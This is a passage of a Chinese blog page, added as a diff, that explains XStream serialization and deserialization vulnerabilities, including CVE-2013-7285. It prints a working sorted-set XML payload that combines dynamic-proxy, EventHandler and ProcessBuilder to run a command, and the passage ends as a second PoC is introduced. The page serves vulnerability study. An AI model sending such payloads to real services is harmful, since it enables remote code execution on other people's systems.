@@ -1,0 +1,2167 @@
+<!DOCTYPE html>
+<html>
+  <!-- meta/link... -->
+  
+
+
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+  <title>XStream反序列化 | CurlySean&#39;s Blog</title>
+
+  <link rel="icon" type="image/png" href="/medias/logo.png">
+  <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
+  <link href="https://unpkg.com/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+  <link href="/js/swiper/swiper@5.4.1.min.css" rel="stylesheet">
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/animate.min.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+    <link href="https://unpkg.com/@fancyapps/ui@5.0/dist/fancybox/fancybox.css" rel="stylesheet">
+  
+  
+    
+<link rel="stylesheet" href="/js/shareJs/share.min.css">
+
+  
+  <style>
+        @media (max-width: 992px) {
+            #waifu {
+                display: none;
+            }
+        }
+    </style>
+    <script defer src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+
+    
+    
+    <!-- 依赖于jquery和vue -->
+    <script src="https://unpkg.com/jquery@3.5.1/dist/jquery.min.js"></script>
+    <script src="https://unpkg.com/vue@2.6.11/dist/vue.min.js"></script>
+
+    <!-- import link -->
+    
+        
+            
+        
+            
+        
+    
+    <!-- import script -->
+    
+        
+            
+        
+            
+        
+    
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  
+  <!-- 预加载动画 -->
+  
+  
+  <div class="preloader_6" id="loader">
+  <div class="loader"></div>
+</div>
+  <script>
+    var endLoading = function () {
+      document.body.style.overflow = 'auto';
+      document.getElementById('loader').classList.add("loaded");
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+  </script>
+
+
+  <body>
+    <!-- 判断是否为暗黑风格 -->
+    <!-- 判断是否为黑夜模式 -->
+<script defer>
+  let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+
+  if (isDark) {
+    $(document.body).addClass('darkModel');
+  }
+</script>
+
+    <!-- 需要在上面加载的js -->
+    <script>
+  function loadScript(src, cb) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var HEAD = document.getElementsByTagName("head")[0] || document.documentElement;
+        var script = document.createElement("script");
+        script.setAttribute("type", "text/javascript");
+        if (cb) {
+          if (JSON.stringify(cb)) {
+            for (let p in cb) {
+              if (p == "onload") {
+                script[p] = () => {
+                  cb[p]()
+                  resolve()
+                }
+              } else {
+                script[p] = cb[p]
+                script.onload = resolve
+              }
+            }
+          } else {
+            script.onload = () => {
+              cb()
+              resolve()
+            };
+          }
+        } else {
+          script.onload = resolve
+        }
+        script.setAttribute("src", src);
+        HEAD.appendChild(script);
+      });
+    });
+  }
+
+  //https://github.com/filamentgroup/loadCSS
+  var loadCSS = function (src) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var link = document.createElement('link');
+        link.rel = "stylesheet";
+        link.href = src;
+        link.onload = resolve;
+        document.getElementsByTagName("head")[0].appendChild(link);
+      });
+    });
+  };
+
+</script> 
+
+<!-- 轮播图所需要的js -->
+<script src="/js/swiper/swiper.min.js"></script>
+<script src="/js/swiper/vue-awesome-swiper.js"></script>
+<script src="/js/swiper/swiper.animate1.0.3.min.js"></script>
+
+<script type="text/javascript">
+  Vue.use(window.VueAwesomeSwiper)
+</script>
+
+
+  <script src="/js/vue-typed-js/index.js"></script>
+
+
+<!-- 首页的公告滚动插件的js需要重新加载 -->
+<script src="/js/vue-seamless-scroll/index.js"></script>
+
+<!-- 打字机效果js -->
+<script src="https://unpkg.com/typed.js@2.0.11"></script>
+
+
+    <div id="safearea">
+      <main class="main" id="pjax-container">
+        <!-- 头部导航 -->
+        
+<header class="header  " 
+  id="navHeader"
+  style="position: fixed;
+  left: 0; top: 0; z-index: 10;width: 100%;"
+>
+  <div class="header-content">
+    <div class="bars">
+      <div id="appDrawer" class="sidebar-image">
+  <div class="drawer-box-icon">
+    <i class="fas fa-bars" aria-hidden="true" @click="showDialogDrawer"></i>
+  </div>
+  
+  <transition name="fade">
+    <div class="drawer-box_mask" v-cloak style="display: none;" v-show="visible" @click.self="cancelDialogDrawer">
+    </div>
+  </transition>
+  <div class="drawer-box" :class="{'active': visible}">
+    <div class="drawer-box-head bg-color">
+      <img class="drawer-box-head_logo lazyload placeholder" src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="logo">
+      <h3 class="drawer-box-head_title">CurlySean&#39;s Blog</h3>
+      <h5 class="drawer-box-head_desc"></h5>
+    </div>
+    
+    <div class="drawer-box-content">
+      <ul class="drawer-box-content_menu">
+        
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-home" aria-hidden="true"></i>
+                  
+                  <span class="name">首页</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/archives" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-archive" aria-hidden="true"></i>
+                  
+                  <span class="name">归档</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/tags" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-tags" aria-hidden="true"></i>
+                  
+                  <span class="name">标签</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/categories" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-bookmark" aria-hidden="true"></i>
+                  
+                  <span class="name">分类</span>
+                </a>
+              
+            </li>
+          
+        
+        
+          <li class="drawer-box-content_item">
+            <a target="_blank" rel="noopener" href="https://github.com/CurlySean">
+              <i class="fas fa-github" aria-hidden="true"></i>
+              <span>Github</span>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</div>
+
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appDrawer',
+    data: {
+      visible: false,
+      top: 0,
+      openArr: [],
+    },
+    computed: {
+    },
+    mounted() {
+    },
+    methods: {
+      isOpen(index) {
+        if (this.openArr.includes(index)) {
+          return true;
+        } else {
+          return false;
+        }
+      },
+      openOrCloseMenu(curIndex) {
+        const index = this.openArr.indexOf(curIndex);
+        if (index !== -1) {
+          this.openArr.splice(index, 1);
+        } else {
+          this.openArr.push(curIndex);
+        }
+      },
+      showDialogDrawer() {
+        this.visible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'width: 100%; height: 100%;overflow: hidden;';
+      },
+      cancelDialogDrawer() {
+        this.visible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      }
+    },
+    created() {}
+  })
+</script>
+
+    </div>
+    <div class="blog-title" id="author-avatar">
+      
+        <div class="avatar">
+          <img src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="logo">
+        </div>
+      
+      <a href="/" class="logo">CurlySean&#39;s Blog</a>
+    </div>
+    <nav class="navbar">
+      <ul class="menu">
+        
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/" class="menu-item-link" title="首页">
+                  
+                    <i class="fas fa-home" aria-hidden="true"></i>
+                  
+                  <span class="name">首页</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/archives" class="menu-item-link" title="归档">
+                  
+                    <i class="fas fa-archive" aria-hidden="true"></i>
+                  
+                  <span class="name">归档</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/tags" class="menu-item-link" title="标签">
+                  
+                    <i class="fas fa-tags" aria-hidden="true"></i>
+                  
+                  <span class="name">标签</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/categories" class="menu-item-link" title="分类">
+                  
+                    <i class="fas fa-bookmark" aria-hidden="true"></i>
+                  
+                  <span class="name">分类</span>
+                </a>
+              
+            </li>
+          
+        
+      </ul>
+      
+      
+        <div id="appSearch">
+  <div class="search"  @click="showDialog()"><i class="fas fa-search" aria-hidden="true"></i></div>
+  <transition name="fade">
+    <div class="message-box_wrapper" style="display: none;" v-cloak v-show="dialogVisible" @click.self="cancelDialogVisible()">
+      <div class="message-box animated bounceInDown">
+        <h2>
+          <span>
+            <i class="fas fa-search" aria-hidden="true"></i>
+            <span class="title">本地搜索</span>
+          </span>
+          <i class="fas fa-times close" pointer style="float:right;" aria-hidden="true" @click.self="cancelDialogVisible()"></i>
+        </h2>
+        <form class="site-search-form">
+          <input type="text"
+            placeholder="请输入关键字"
+            id="local-search-input" 
+            @click="getSearchFile()"
+            class="st-search-input"
+            v-model="searchInput"
+          />
+        </form>
+        <div class="result-wrapper">
+          <div id="local-search-result" class="local-search-result-cls"></div>
+        </div>
+      </div>
+    </div>
+  </transition>
+</div>
+<script src="/js/local_search.js"></script>
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appSearch',
+    data: {
+      dialogVisible: false,
+      searchInput: '',
+      top: 0,
+    },
+    computed: {
+    },
+    mounted() {
+      window.addEventListener('pjax:complete', () => {
+        this.cancelDialogVisible();
+      })
+    },
+    methods: {
+      showDialog() {
+        this.dialogVisible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'overflow: hidden;';
+      },
+      getSearchFile() {
+        if (!this.searchInput) {
+          getSearchFile("/search.xml");
+        }
+      },
+      cancelDialogVisible() {
+        this.dialogVisible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      },
+    },
+    created() {}
+  })
+</script>
+<!-- 解决刷新页面闪烁问题，可以在元素上添加display: none, 或者用vue.extend方法，详情：https://blog.csdn.net/qq_31393401/article/details/81017912 -->
+<!-- 下面是搜索基本写法 -->
+<!-- <script type="text/javascript" id="local.search.active">
+  var inputArea = document.querySelector("#local-search-input");
+  inputArea.onclick   = function(){ getSearchFile(); this.onclick = null }
+  inputArea.onkeydown = function(){ if(event.keyCode == 13) return false }
+</script> -->
+
+      
+
+    </nav>
+  </div>
+  
+    <a target="_blank" rel="noopener" href="https://github.com/CurlySean" class="github-corner color-primary" aria-label="View source on GitHub"><svg width="60" height="60" viewBox="0 0 250 250" style="fill:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+  
+  
+</header>
+        <!-- 内容区域 -->
+        
+<!-- prismjs 代码高亮 -->
+
+
+
+
+<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>
+
+
+  <!-- 文章详情页顶部图片和标题 -->
+
+
+
+
+<div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
+  background-position: center center;position: relative;background-image:url('https://pic2.zhimg.com/80/v2-63bbdb5b76b8d349ad35ff4281efbd37_1440w.webp')">
+  <div class="post-detail-header-mask"></div>
+  <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
+  
+  <div class="post-detail-header_info-box">
+    <div class="title-box">
+      <span class="title">
+        XStream反序列化
+      </span>
+    </div>
+    
+    
+      
+        <span class="post-detail-header_date">
+          <i class="fas fa-calendar"></i> 发表于：2025-07-23 |
+        </span>
+      
+
+      
+        <span class="post-detail-header_categories">
+          <i class="iconfont iconbookmark1"></i> 分类：
+          
+            <a href="/categories/Java/" class="post-detail-header_category">
+              Java
+            </a>
+          
+        </span>
+      
+
+      
+    
+  </div>
+  
+  
+    <script defer src="/js/bubble/bubble.js"></script>
+  
+</div>
+
+
+
+
+
+<div class="post-detail-content post-row" 
+  style="padding-top: 0px;">
+  <div class="main-content">
+    <article class="post post-detail">
+      <div class="post-content">
+        <h1 id="pHjEh">XStream反序列化</h1>
+<h2 id="HYMga">XStream基础</h2>
+<h3 id="CiWpH">XStream简介</h3>
+
+<p>XStream 是一个 Java 库，用于简化 Java 对象与 XML 之间的相互转换（序列化与反序列化）。它允许开发人员将 Java 对象直接转换为 XML 格式，或从 XML 恢复为原始对象，无需编写复杂的解析代码。</p>
+<h3 id="NQH63">XStreamDemo</h3>
+
+<p>这里我们来看如何使用XStream进行序列化和反序列化操作</p>
+<h4 id="HQqKY">序列化</h4>
+
+<p>首先定义接口</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IPerson</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">output</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后定义Person类实现前面的接口</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">IPerson</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">output</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.print(<span class="string">&quot;Hello, this is &quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;, age &quot;</span> + <span class="built_in">this</span>.age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>XStream序列化使用<code>XStream.toXML()</code>来实现类到XML的转化</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Serialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        person.name = <span class="string">&quot;Sean&quot;</span>;</span><br><span class="line">        person.age =<span class="number">18</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>().toXML(person);</span><br><span class="line">        System.out.println(xml);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>序列化后的XML数据如下</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Person</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>Sean<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">age</span>&gt;</span>18<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Person</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="a7WyU">反序列化</h4>
+
+<p>同样的定义接口和类，XStream反序列化是通过<code>XStream.fromXML()</code>实现的，其中获取XML文件内容的方式可以通过<code>Scanner</code>或者<code>FileInputStream</code>均可</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.io.xml.DomDriver;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Deserialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;demo.xml&quot;</span>);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person) <span class="keyword">new</span> <span class="title class_">XStream</span>(<span class="keyword">new</span> <span class="title class_">DomDriver</span>()).fromXML(fileInputStream);</span><br><span class="line">        person.output();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752142270637-1f2e8125-ad9c-48ba-a5c0-9de5c2036d96.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752142270637-1f2e8125-ad9c-48ba-a5c0-9de5c2036d96.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<h3 id="ccR02">前置知识</h3>
+XStream总体由五个部分组成，其类图如下：
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752142862533-2aca9f20-1f7a-4e16-8f56-fa8bd0e9c3ab.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752142862533-2aca9f20-1f7a-4e16-8f56-fa8bd0e9c3ab.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<h4 id="IezYj">EventHandler类</h4>
+
+<p><code>EventHandler</code>类是实现了<code>InvocationHandler</code>的一个类 ，设置的本意是为交互工具提供beans，建立从用户界面到应用程序逻辑的连接</p>
+<p><code>EventHandler</code>类定义的代码如下，其含有target和action属性，在<code>EventHandler.invoke()-&gt;EventHandler.invokeInternal()-&gt;MethodUtil.invoke()</code>的函数调用链中，会将前面两个属性作为类方法和参数继续反射调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EventHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> Object target;  </span><br><span class="line">    <span class="keyword">private</span> String action;  </span><br><span class="line">	...  </span><br><span class="line">	  </span><br><span class="line">	<span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(<span class="keyword">final</span> Object proxy, <span class="keyword">final</span> Method method, <span class="keyword">final</span> Object[] arguments)</span> &#123;  </span><br><span class="line">        ...  </span><br><span class="line">                <span class="keyword">return</span> invokeInternal(proxy, method, arguments);  </span><br><span class="line">        ...  </span><br><span class="line">    &#125;  </span><br><span class="line">      </span><br><span class="line">	<span class="keyword">private</span> Object <span class="title function_">invokeInternal</span><span class="params">(Object proxy, Method method, Object[] arguments)</span> &#123;  </span><br><span class="line">        ...  </span><br><span class="line">              </span><br><span class="line">                <span class="type">Method</span> <span class="variable">targetMethod</span> <span class="operator">=</span> Statement.getMethod(  </span><br><span class="line">                             target.getClass(), action, argTypes);  </span><br><span class="line">                ...  </span><br><span class="line">                <span class="keyword">return</span> MethodUtil.invoke(targetMethod, target, newArgs);  </span><br><span class="line">            &#125;  </span><br><span class="line">            ...  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">	...  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="MZFkZ">Converter转换器</h4>
+
+<p>XStream为Java常见的类型提供了Converter转换器。转换器注册中心是XStream组成的核心部分。转换器的职责是提供一种策略，用于将对象图中找到的特定类型的对象转换为XML或将XML转换为对象。</p>
+<p>简单地说，就是输入XML后它能识别其中的标签字段并转换为相应的对象，反之亦然。</p>
+<p>转换器需要实现3个方法：</p>
+<ul>
+<li>canConvert方法：告诉XStream对象，它能够转换的对象；</li>
+<li>marshal方法：能够将对象转换为XML时候的具体操作；</li>
+<li>unmarshal方法：能够将XML转换为对象时的具体操作；</li>
+</ul>
+<p>具体参考：<a target="_blank" rel="noopener" href="http://x-stream.github.io/converters.html">http://x-stream.github.io/converters.html</a></p>
+<h4 id="zPE1W">DynamicProxyConverter 动态代理转换器</h4>
+
+<p><code>DynamicProxyConverter</code> 即动态代理转换器，是 XStream 支持的一种转换器，其存在使得 XStream 能够把 XML 内容反序列化转换为动态代理类对象：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752144461704-4d770386-97ae-4f1a-8389-ab3b09e4c60a.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752144461704-4d770386-97ae-4f1a-8389-ab3b09e4c60a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>XStream 反序列化漏洞的 PoC 都是以 DynamicProxyConverter 这个转换器为基础来编写的。以官方给的例子为例：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">interface</span>&gt;</span>com.foo.Blah<span class="tag">&lt;/<span class="name">interface</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">interface</span>&gt;</span>com.foo.Woo<span class="tag">&lt;/<span class="name">interface</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">&quot;com.foo.MyHandler&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">something</span>&gt;</span>blah<span class="tag">&lt;/<span class="name">something</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">handler</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>dynamic-proxy</code> 标签在 XStream 反序列化之后会得到一个动态代理类对象，当访问了该对象的<code>com.foo.Blah</code> 或 <code>com.foo.Woo</code> 这两个接口类中声明的方法时（即 interface 标签内指定的接口类），就会调用 handler 标签中的类方法 <code>com.foo.MyHandler</code></p>
+<h2 id="xq3UI">漏洞复现与分析</h2>
+<h3 id="q276u">漏洞原理</h3>
+
+<p>XStream 反序列化漏洞的存在是因为 XStream 支持一个名为 <code>DynamicProxyConverter</code> 的转换器，该转换器可以将 XML 中 <code>dynamic-proxy</code> 标签内容转换成动态代理类对象，而当程序调用了 <code>dynamic-proxy</code> 标签内的 <code>interface</code> 标签指向的接口类声明的方法时，就会通过动态代理机制代理访问 <code>dynamic-proxy</code> 标签内 <code>handler</code> 标签指定的类方法。   </p>
+<p>利用这个机制，攻击者可以构造恶意的XML内容，即 <code>dynamic-proxy</code> 标签内的<code> handler</code> 标签指向如 <code>EventHandler</code> 类这种可实现任意函数反射调用的恶意类、<code>interface</code> 标签指向目标程序必然会调用的接口类方法；最后当攻击者从外部输入该恶意 XML 内容后即可触发反序列化漏洞、达到任意代码执行的目的。</p>
+<h3 id="nzzQU">CVE-2013-7285</h3>
+<h4 id="NJS2M">漏洞复现</h4>
+
+<p><code>sorted-set</code>类型的Poc如下，该Poc影响版本为：</p>
+<ul>
+<li>1.3.1&lt;XStream&lt;1.4</li>
+<li>1.4.5&lt;&#x3D;XStream&lt;&#x3D;1.4.6</li>
+<li>1.4.10</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.EventHandler&quot;</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">command</span>&gt;</span>  </span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>Calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;/<span class="name">command</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;/<span class="name">target</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">handler</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>tree-map</code>类型的Poc如下，该Poc影响版本为：</p>
+<ul>
+<li>&lt;&#x3D;1.4.6</li>
+<li>1.4.10</li>
+</ul>
